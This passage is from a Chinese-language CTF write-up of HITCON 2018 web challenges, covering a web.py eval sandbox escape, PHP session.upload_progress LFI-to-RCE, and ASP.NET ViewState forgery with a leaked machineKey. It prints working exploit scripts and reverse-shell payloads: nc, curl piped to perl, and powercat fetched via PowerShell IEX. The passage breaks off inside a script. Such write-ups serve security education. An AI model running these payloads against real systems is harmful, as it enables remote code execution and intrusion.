+<p>可以大膽猜測他就是padding</p>
+<p>到這邊我就去睡覺了</p>
+<p>然後睡醒就發現，隊友猜出DES，然後硬爆出來key: <code>megnnaro</code></p>
+<p>(DES中，每個字元的二進位最低位不會參與運算，再加上提示說key都是小寫，所以key space只有<code>abdfhjlnprtvxz</code>，可以直接暴力踹key。似乎有機會踹到等價的key，但沒差可以去解密文然後載<code>app.py</code>讀code)</p>
+<p>第一題flag: <code>hitcon{megnnaro}</code></p>
+<p>(賽後看到orange說可以用hashcat秒爆: <code>sudo hashcat -a 3 -m 14000 &#39;3ca92540eb2d0a42:0808080808080808&#39; -1 DESALL.txt --hex-charset ?1?1?1?1?1?1?1?1 -n 4 --force --potfile-disable</code>)</p>
+<p>接著我就繼續看v2的部分</p>
+<p>有了key之後，就能還原明文，然後可以修改下載功能的檔名，達到任意下載</p>
+<p>第一步當然就是看 app.py: <code>m=d&amp;f=app.py</code></p>
+<p><a href="https://github.com/w181496/CTF/blob/master/hitcon2018/OhMyRaddit/app.py" target="_blank" rel="external">https://github.com/w181496/CTF/blob/master/hitcon2018/OhMyRaddit/app.py</a></p>
+<p>可以看到他使用<code>web.py</code></p>
+<p>參數<code>m</code>為<code>r</code>代表取出record，為<code>d</code>代表下載，為<code>p</code>代表抓文章(可以設定limit)</p>
+<p>剛好之前有瞄過web.py的洞</p>
+<p>所以我很快就找到這個 <a href="https://github.com/webpy/webpy/commit/8fa67f40f212fbfe51aa5493fc377c683eff9925" target="_blank" rel="external">issue</a></p>
+<p>可以看到他這邊是對RCE做的防禦，他下面有個邪惡的<code>eval</code></p>
+<p>也因為很久以前聽過，所以大概猜到這邊可以繞過<code>dictionary[&#39;__builtins__&#39;] = object()</code></p>
+<p>而只需要從<code>m=p&amp;l=${command}</code>就會從limit走到eval那邊</p>
+<p>接著就是Bypass了</p>
+<p>隊友一個秒速Bypass:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: UTF-8</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</div><div class="line"></div><div class="line"></div><div class="line">ENCRPYTION_KEY = <span class="string">'megnnaro'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></div><div class="line">    length = DES.block_size - (len(s) % DES.block_size)</div><div class="line">    s = s + chr(length)*length</div><div class="line"></div><div class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</div><div class="line">    <span class="keyword">return</span> cipher.encrypt(s).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"></div><div class="line">tmp = &#123;</div><div class="line">    <span class="string">'m'</span>: <span class="string">'p'</span>, </div><div class="line">    <span class="string">'l'</span>: <span class="string">"$&#123;[].__class__.__base__.__subclasses__()[-68]('/read_flag | nc kaibro.tw 6666',shell=1)&#125;"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">print(encrypt(urllib.urlencode(tmp)))</div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://13.115.255.46/?s="</span>+encrypt(urllib.urlencode(tmp)))</div><div class="line"></div><div class="line">print(r.text)</div></pre></td></tr></table></figure>
+<p><code>hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}</code></p>
+<p><br></p>
+<h1 id="One_Line_PHP_Challenge"><a href="#One_Line_PHP_Challenge" class="headerlink" title="One Line PHP Challenge"></a>One Line PHP Challenge</h1><p><img src="https://i.imgur.com/s33Yde0.png" alt=""></p>
+<p>神題，只有短短一行，但只有3隊解掉</p>
+<p>看到這題，第一個想到的就是踹各種PHP Wrapper/Protocol</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">file:</span><span class="comment">// — Accessing local filesystem</span></div><div class="line"><span class="symbol">http:</span><span class="comment">// — Accessing HTTP(s) URLs</span></div><div class="line"><span class="symbol">ftp:</span><span class="comment">// — Accessing FTP(s) URLs</span></div><div class="line"><span class="symbol">php:</span><span class="comment">// — Accessing various I/O streams</span></div><div class="line"><span class="symbol">zlib:</span><span class="comment">// — Compression Streams</span></div><div class="line"><span class="symbol">data:</span><span class="comment">// — Data (RFC 2397)</span></div><div class="line"><span class="symbol">glob:</span><span class="comment">// — Find pathnames matching pattern</span></div><div class="line"><span class="symbol">phar:</span><span class="comment">// — PHP Archive</span></div><div class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></div><div class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></div><div class="line"><span class="symbol">ogg:</span><span class="comment">// — Audio streams</span></div><div class="line"><span class="symbol">expect:</span><span class="comment">// — Process Interaction Streams</span></div></pre></td></tr></table></figure>
+<p>由於<code>allow_url_include</code>沒開，所以很多wrapper到了<code>include()</code>都沒辦法利用</p>
+<p>接著就很自然地想到phpinfo+lfi去RCE的套路</p>
+<p>(沒聽過這個經典招的可以參考這個: <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a>)</p>
+<p>硬傳檔案上去，然後再刪除前的這短暫時間去Race Condition include拿shell</p>
+<p>只是這題沒辦法直接取得tmp檔名，而且賽後才知道Ubuntu 17後預設開啟<code>PrivateTmp</code>，所以沒辦法使用這招拿shell</p>
+<p>前幾天才聽cyku提過這個，但沒想到Ubuntu高版本預設會啟用…</p>
+<p>PrivateTmp細節可以看這篇 <a href="https://www.cnblogs.com/lihuobao/p/5624071.html" target="_blank" rel="external">https://www.cnblogs.com/lihuobao/p/5624071.html</a></p>
+<p><br></p>
+<p>然後賽後檢討才知道，原來預設會開<code>session.upload_progress</code></p>
+<p>(之前在某場中國CTF似乎碰過，但我賽中完全沒想到QQ)</p>
+<p>他主要是用來給我們監控上傳檔案進度的功能</p>
+<p>詳細可以參考 <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">http://php.net/manual/zh/session.upload-progress.php</a></p>
+<p>簡單說，當<code>session.upload_progress.enabled</code>開啟時，我們可以發送POST請求</p>
+<p>PHP會在<code>$_SESSION</code>中添加我們的資料，若配合LFI，就能getshell</p>
+<p>當<code>session.upload_progress.cleanup=on</code>時，上傳成功的Session會立刻銷毀，必須Race condition來getshell</p>
+<p>由於題目有給我們版本資訊，我們可以知道該版本session存放路徑為<code>/var/lib/php/sessions</code></p>
+<p>成功上傳的SESSION內容會放在<code>sess_{PHPSESSID}</code>中</p>
+<p>裡頭內容大致上長這樣:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">upload_progress_aaaa|<span class="string">a:</span><span class="number">5</span>:&#123;<span class="string">s:</span><span class="number">10</span>:<span class="string">"start_time"</span>;<span class="string">i:</span><span class="number">1540600520</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"content_length"</span>;<span class="string">i:</span><span class="number">7182</span>;<span class="string">s:</span><span class="number">15</span>:<span class="string">"bytes_processed"</span>;<span class="string">i:</span><span class="number">5357</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"done"</span>;<span class="string">b:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"files"</span>;<span class="string">a:</span><span class="number">1</span>:&#123;<span class="string">i:</span><span class="number">0</span>;<span class="string">a:</span><span class="number">7</span>:&#123;<span class="string">s:</span><span class="number">10</span>:<span class="string">"field_name"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"f"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"passwd"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"tmp_name"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"error"</span>;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"done"</span>;<span class="string">b:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"start_time"</span>;<span class="string">i:</span><span class="number">1540600520</span>;<span class="string">s:</span><span class="number">15</span>:<span class="string">"bytes_processed"</span>;<span class="string">i:</span><span class="number">5357</span>;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
+<p>所以我們已經可以控制檔名和一部分裡頭的內容了</p>
+<p>接著就是想辦法通過開頭為<code>@&lt;?php</code>的檢查</p>
+<p>這裡可以利用到php warpper的特性</p>
+<p>他可以針對輸入流做base64, rot13, …等各種encode/decode</p>
+<p>而<code>file</code>和<code>include()</code>都支援這種用法</p>
+<p>我們只要想辦法找出一種組合讓最後SESSION內容變成<code>@&lt;?php</code>開頭就行!</p>
+<p>這邊orange官方做法是去Base64 Decode三次</p>
+<p>讓他Decode完結果剛好前面多餘的<code>upload_progress_</code>字串都爛掉，只留我們最後可控的部分</p>
+<p>由於要decode三次，所以得保證三次decode完要變空字串，且不會吃到後面我們真正要放的<code>@&lt;?php xxx</code></p>
+<p>這邊orange的做法是先塞<code>ZZ</code>在payload前，如此一來<code>upload_progress_ZZ</code>去base64 decode三次之後剛好會變空字串，且不會影響到後面</p>
+<p>隨便亂塞的話，影響到後面的機率非常高，因為base64 decode是4個bytes、4個bytes去抓</p>
+<p>只要中間值的範圍內可見字元非4的倍數就會往後抓，往後抓就很容易搞爛我們的payload</p>
+<p>(p.s. php base64塞非範圍內字元不會影響結果，所以<code>_</code>之類的字元不影響)</p>
+<p><img src="https://i.imgur.com/mXenNhd.png" alt=""></p>
+<p>然後後面部分還要注意三次decode時，中間值不能有<code>=</code>，測試發現<code>php://filter</code>在base64 decode遇到<code>XXX=YYY</code>這種狀況，decode會噴錯<br>(用<code>base64_decode()</code>就不會)</p>
+<p><img src="https://i.imgur.com/NBzQDob.png" alt=""></p>
+<p>所以像以下orange的exp，就特別去random找中間值不會出現<code>=</code>的junk字串塞在後面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</div><div class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">HOST = <span class="string">'http://54.250.246.238/'</span></div><div class="line">sess_name = <span class="string">'iamorange'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </div><div class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</div><div class="line">&#125;</div><div class="line"></div><div class="line">payload = <span class="string">'@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</div><div class="line">    x = b64encode(payload + junk)</div><div class="line">    xx = b64encode(b64encode(payload + junk))</div><div class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</div><div class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</div><div class="line">        payload = xxx</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</div><div class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</div><div class="line">        fp.close()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></div><div class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</div><div class="line">    filename = <span class="string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> % filename</div><div class="line">    <span class="comment"># print filename</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        url = <span class="string">'%s?orange=%s'</span> % (HOST, filename)</div><div class="line">        r = requests.get(url, headers=headers)</div><div class="line">        c = r.content</div><div class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">'orange'</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</div><div class="line">            <span class="keyword">print</span> [c]</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</div><div class="line">    runner = runner1</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    runner = runner2</div><div class="line"></div><div class="line">pool = ThreadPool(<span class="number">32</span>)</div><div class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</div></pre></td></tr></table></figure>
+<p>除了<code>base64_decode</code>外，也可以用各種encode方法，例如<code>strip_tags</code>，只要讓開頭最後變成<code>@&lt;?php</code>即可</p>
+<p><br></p>
+<h1 id="Why_so_Serials_3F"><a href="#Why_so_Serials_3F" class="headerlink" title="Why so Serials?"></a>Why so Serials?</h1><p><img src="https://i.imgur.com/f7kOk3E.png" alt=""></p>
+<p>P.S. 因為以前幾乎沒碰過ASP.net的題目，所以這邊主要是根據<a href="https://cyku.tw/ctf-hitcon-2018-why-so-serials/" target="_blank" rel="external">cyku的writeup</a>和<a href="https://github.com/orangetw/My-CTF-Web-Challenges#why-so-serials" target="_blank" rel="external">orange的writeup</a>整理和各種google查資料學習而來</p>
+<p>這題題目只有一個上傳頁面<code>Default.aspx</code></p>
+<p>有給Source Code: <a href="http://13.115.118.60/Default.aspx.txt" target="_blank" rel="external">http://13.115.118.60/Default.aspx.txt</a></p>
+<p>從Code可以看到，幾乎所有可以執行的副檔名都擋光了</p>
+<p>但是可以發現他沒擋掉<code>.shtml</code></p>
+<p><a href="http://13.115.118.60/kaibro.shtml" target="_blank" rel="external">http://13.115.118.60/kaibro.shtml</a></p>
+<p>隨便踹一下，從錯誤訊息會看到<code>SSINC-shtml</code></p>
+<p><img src="https://i.imgur.com/BRRmxrf.png" alt=""></p>
+<p>因此可以知道Server有開SSI(Server Side Include)</p>
+<p>所以可以透過上傳<code>.shtml</code>, <code>.shtm</code>等副檔名的檔案來達到File Inclusion</p>
+<p>其實SSI也有機會直接RCE，可以用<code>&lt;!--#exec cmd=&quot;command&quot;--&gt;</code></p>
+<p>但試了一下，發現Server沒開EXEC，此路不通</p>
+<p><img src="https://i.imgur.com/Whk0KIy.png" alt=""></p>
+<p>那我們就只能從讀檔下手了</p>
+<p>上傳<code>&lt;!--#include file=&quot;../../web.config&quot;--&gt;</code>後</p>
+<p>我們可以看到<code>machinekey</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">customErrors</span> <span class="attr">mode</span>=<span class="string">"Off"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">validationKey</span>=<span class="string">"b07b0f97365416288cf0247cffdf135d25f6be87"</span> <span class="attr">decryptionKey</span>=<span class="string">"6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3"</span> <span class="attr">decryption</span>=<span class="string">"DES"</span> <span class="attr">validation</span>=<span class="string">"MD5"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>這樣一來我們就得到Machinekey了，所以加解密、MAC都沒問題惹</p>
+<p>所以這題另一考點就是在<code>ViewState</code></p>
+<p>ViewState會把Web Form的內容保存下來，所以我們查看網頁原始碼可以看到有一些hidden的input tag，這樣做可以減少Server負擔</p>
+<p>這邊可以看詳細介紹 <a href="https://msdn.microsoft.com/en-us/library/ms972976.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms972976.aspx</a></p>
+<p>最重要的地方是ViewState存放的資料會經過序列化，取出時會反序列化</p>
+<p>所以這邊其實就有一個反序列化漏洞，透過pwntester的<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="external">ysoserial.net</a>就可以直接串Gadget去RCE</p>
+<p>只是通常ViewState都會有加密和MAC驗證，沒辦法直接偽造</p>
+<p>這時候Machinekey就派上用場了</p>
+<p>但其實以這題來說，他並沒有對ViewState加密，我們可以直接得到裡頭的內容 (因為沒有設定<code>viewStateEncryptionMode</code>)</p>
+<p>Burp本身可以解ViewState，不喜歡用Burp的也可以找一些Online Decode網站去解ViewState (<a href="https://www.httpdebugger.com/tools/ViewstateDecoder.aspx" target="_blank" rel="external">https://www.httpdebugger.com/tools/ViewstateDecoder.aspx</a>)</p>
+<p><img src="https://i.imgur.com/hVgF92c.png" alt=""></p>
+<p>可以看到ViewState的確不需要用Key解密，直接Decode就能解出來了</p>
+<p>所以接著就去看該怎麼做MAC</p>
+<p>這邊就參考Cyku的做法，直接去讀.net做MAC的Source Code</p>
+<p>從這個<a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter" target="_blank" rel="external">連結</a>，可以知道，ViewState是透過 <code>ObjectStateFormatter</code> 去做序列化的</p>
+<blockquote>
+<p>ObjectStateFormatter is used by the PageStatePersister class and classes that derive from it to serialize view state and control state. </p>
+</blockquote>
+<p>由於.net是open source，我們直接跟一下GitHub上的Code:</p>
+<p><a href="https://github.com/Microsoft/referencesource/blob/master/System.Web/UI/ObjectStateFormatter.cs#L766-L812" target="_blank" rel="external">https://github.com/Microsoft/referencesource/blob/master/System.Web/UI/ObjectStateFormatter.cs#L766-L812</a></p>
+<p>其中<a href="https://github.com/Microsoft/referencesource/blob/master/System.Web/UI/ObjectStateFormatter.cs#L798-L801" target="_blank" rel="external">第798-801行</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// We need to encode if the page has EnableViewStateMac or we got passed in some mac key string`</div><div class="line">else if ((_page != null &amp;&amp; _page.EnableViewStateMac) || _macKeyBytes != null) &#123;</div><div class="line">        buffer = MachineKeySection.GetEncodedData(buffer, GetMacKeyModifier(), 0, ref length);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以猜測這邊的<code>MachineKeySection.GetEncodedData()</code>應該是關鍵的邏輯部分</p>
+<p>跟進<code>MachineKeySection.cs</code>的<a href="https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/Configuration/MachineKeySection.cs#L791-L823" target="_blank" rel="external">791-823行</a></p>
+<p>裡頭呼叫了852-871行的<a href="https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/Configuration/MachineKeySection.cs#L852-L871" target="_blank" rel="external">HashData
+</a></p>
+<p>這邊<a href="https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/Configuration/MachineKeySection.cs#L857-L858" target="_blank" rel="external">857-858行</a>的<code>s_config.Validation == MachineKeyValidation.MD5</code>應該是去判斷我們web.config中Validation的方法是否是用<code>MD5</code>，是的話就呼叫<code>HashDataUsingNonKeyedAlgorithm()</code></p>
+<p>繼續跟進去<a href="https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/Configuration/MachineKeySection.cs#L1216-L1235" target="_blank" rel="external">這個函數</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">private static byte[] HashDataUsingNonKeyedAlgorithm(HashAlgorithm hashAlgo, byte[] buf, byte[] modifier,</div><div class="line">                                                             int start, int length, byte[] validationKey)</div><div class="line">&#123;</div><div class="line">    int     totalLength = length + validationKey.Length + ((modifier != null) ? modifier.Length : 0);</div><div class="line">    byte [] bAll        = new byte[totalLength];</div><div class="line"></div><div class="line">    Buffer.BlockCopy(buf, start, bAll, 0, length);</div><div class="line">    if (modifier != null) &#123;</div><div class="line">        Buffer.BlockCopy(modifier, 0, bAll, length, modifier.Length);</div><div class="line">    &#125;</div><div class="line">    Buffer.BlockCopy(validationKey, 0, bAll, length, validationKey.Length);</div><div class="line">    if (hashAlgo != null) &#123;</div><div class="line">        return hashAlgo.ComputeHash(bAll);</div><div class="line">    &#125; else &#123;</div><div class="line">        byte[] newHash = new byte[MD5_HASH_SIZE];</div><div class="line">        int hr = UnsafeNativeMethods.GetSHA1Hash(bAll, bAll.Length, newHash, newHash.Length);</div><div class="line">        Marshal.ThrowExceptionForHR(hr);</div><div class="line">        return newHash;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>這邊可以觀察到他會把<code>buf</code>從offset 0複製到<code>bAll</code> offset 0開始的位置，複製length長度</p>
+<p>後面會將<code>modifier</code>從offset 0複製到<code>bAll</code> offset length開始的位置，也就是從剛剛前面的位置後面繼續複製</p>
+<p>最後會再把<code>validationKey</code>從offset複製到<code>bAll</code> offset length開始的位置，也就是直接把剛剛modifier又蓋掉</p>
+<p>而<code>modifier</code>的來源是ObjectStateFormatter.cs<br>裡<code>Serialize()</code>的<a href="https://github.com/Microsoft/referencesource/blob/master/System.Web/UI/ObjectStateFormatter.cs#L800" target="_blank" rel="external">第800行</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">buffer = MachineKeySection.GetEncodedData(buffer, GetMacKeyModifier(), 0, ref length);</div></pre></td></tr></table></figure>
+<p>這邊的<code>GetMacKeyModifier()</code></p>
+<p><code>GetMacKeyModifier()</code>的Source Code在<code>ObjectStateFormatter.cs</code>的<a href="https://github.com/Microsoft/referencesource/blob/master/System.Web/UI/ObjectStateFormatter.cs#L212-L242" target="_blank" rel="external">212-242行</a></p>
+<p>可以觀察到在<code>viewStateUserKey != null</code>時，回傳的<code>_macKeyBytes</code>只有4 bytes</p>
+<p>所以以這題情況來說，<code>modifier</code>的BlockCopy就完全沒意義，因為他跟<code>validationKey</code>寫入的位置一樣，而<code>validationKey</code>長度又比<code>modifier</code>長</p>
+<p>buffer都複製完後，就會開始做以下的Hash:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">byte[] newHash = new byte[MD5_HASH_SIZE];</div><div class="line">int hr = UnsafeNativeMethods.GetSHA1Hash(bAll, bAll.Length, newHash, newHash.Length);</div><div class="line">Marshal.ThrowExceptionForHR(hr);</div><div class="line">return newHash;</div></pre></td></tr></table></figure>
+<p>這邊雖然函數名是<code>GetSHA1Hash</code>，但實際回傳是MD5 Hash</p>
+<p>所以總結一下，MD5 最後的MAC其實是:</p>
+<p><code>md5(serialized_data + validation_key + &quot;\x00\x00\x00\x00&quot;)</code></p>
+<p>最後有4 bytes 0的原因是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int     totalLength = length + validationKey.Length + ((modifier != null) ? modifier.Length : 0);</div><div class="line">byte [] bAll        = new byte[totalLength];</div></pre></td></tr></table></figure>
+<p><code>bAll</code>在create時，它的長度是serialized data長度+<code>validationKey</code>長度+<code>modifier</code>長度</p>
+<p>可是我們<code>modifier</code>和<code>validationKey</code>實際上重疊了，所以會多出最後的<code>modifier</code>長度的空間</p>
+<p>到目前為止我們已經知道MAC的生成方法了</p>
+<p>接著我們要偽造ViewState，就只需要把偽造的Seriailzed data按照上面方法簽完MAC，再串起來做Base64即可:</p>
+<p><code>Base64(serialized_data + MAC)</code></p>
+<p>即:</p>
+<p><code>Base64(serialized_data + md5(serialized_data + validation_key + &quot;\x00\x00\x00\x00&quot;))</code></p>
+<p>OK</p>
+<p>懂算法後就能構造Payload了</p>
+<p><code>ysoserial.net</code>得先裝個VisualStudio環境Build來跑，頗麻煩</p>
+<p>下這行指令就能生成Base64後的Serialized data:</p>
+<p><code>ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c &quot;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c kaibro.tw -p 5278 -e cmd&quot; -o base64</code></p>
+<p>接著，就照著前面算法去算MAC並append到serialized_data後面做base64:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">serialized_data_b64 = <span 